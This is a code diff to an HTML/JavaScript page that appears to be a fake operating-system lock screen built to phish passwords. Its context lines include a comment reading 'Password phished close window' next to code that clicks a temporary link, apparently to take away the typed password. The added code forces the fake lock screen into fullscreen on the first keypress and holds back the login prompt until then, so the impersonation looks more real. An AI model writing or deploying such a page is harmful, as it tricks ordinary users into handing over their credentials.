@@ -67,6 +67,8 @@
 </body>
 
 <script>
+    let allreadymaxed = false;  
+
     window.onload = function time() {
         var monthName = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];
         var dayName = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday', 'Sunday']
@@ -84,6 +86,9 @@
         document.getElementById('clock').innerHTML = hour + ":" + minute;
         document.getElementById('date').innerHTML = day + ", " + month + " " + date;
 
+        var a = document.createElement('a');
+        a.click();
+
         var t = setTimeout(time, 500);
     }
 
@@ -93,30 +98,32 @@
     }
 
     function overlay() {
-        // get rid of overlay
-        document.getElementById("overlay").style.display = "none";
+        if(allreadymaxed == true){
+            // get rid of overlay
+            document.getElementById("overlay").style.display = "none";
 
-        // switch
-        var switchAnimation = "opacity: 0; transform: scale(1.2); transition-duration: 0.2s;"
+            // switch
+            var switchAnimation = "opacity: 0; transform: scale(1.2); transition-duration: 0.2s;"
 
-        var timeStyle = document.getElementById("time").style;
-        timeStyle.cssText = switchAnimation;
+            var timeStyle = document.getElementById("time").style;
+            timeStyle.cssText = switchAnimation;
 
-        var ico1 = document.getElementsByClassName("send-email")[0].style;
-        ico1.cssText = switchAnimation;
+            var ico1 = document.getElementsByClassName("send-email")[0].style;
+            ico1.cssText = switchAnimation;
 
-        var ico1 = document.getElementsByClassName("internet-1")[0].style;
-        ico1.cssText = switchAnimation;
+            var ico1 = document.getElementsByClassName("internet-1")[0].style;
+            ico1.cssText = switchAnimation;
 
-        setTimeout(function () { removeTime(); }, 200);
+            setTimeout(function () { removeTime(); }, 200);
 
-        var loginDiv = document.getElementById("login").style;
-        loginDiv.cssText = "opacity: 1; transition-duration: 0.5s; background-color: rgba(0, 0, 0, 0.5);";
+            var loginDiv = document.getElementById("login").style;
+            loginDiv.cssText = "opacity: 1; transition-duration: 0.5s; background-color: rgba(0, 0, 0, 0.5);";
 
-        setTimeout(function () { document.getElementById("pw").focus(); }, 1);
+            setTimeout(function () { document.getElementById("pw").focus(); }, 1);
 
 
-        document.getElementById("background").style.cssText = "transform: scale(1.05);"
+            document.getElementById("background").style.cssText = "transform: scale(1.05);"
+        }
     }
 
     function removeTime() {
@@ -140,7 +147,7 @@
             a.click();
             // Remove the temporary link element
             document.body.removeChild(a);
-
+            
             //Password phished close window
             //window.close();
 
@@ -164,6 +171,30 @@
         eA.cssText = "display: none;";
         eB.cssText = "display: initial";
     }
+
+    function maxWindow(event){
+        if (event.keyCode != 13){
+            if(allreadymaxed == false){
+                var element = document.getElementById('lockscreen');
+                if (element.requestFullscreen) {
+                    element.requestFullscreen();
+                } else if (element.mozRequestFullScreen) { // Firefox
+                    element.mozRequestFullScreen();
+                } else if (element.webkitRequestFullscreen) { // Chrome, Safari and Opera
+                    element.webkitRequestFullscreen();
+                } else if (element.msRequestFullscreen) { // IE/Edge
+                    element.msRequestFullscreen();
+                }
+                allreadymaxed = true;
+            }
+        }
+    }
+
+  // Open "lockscreen" element in fullscreen when the page loads
+  window.addEventListener('keydown', function(event) {
+    maxWindow(event);
+  });
+  
 </script>
 
 </html>
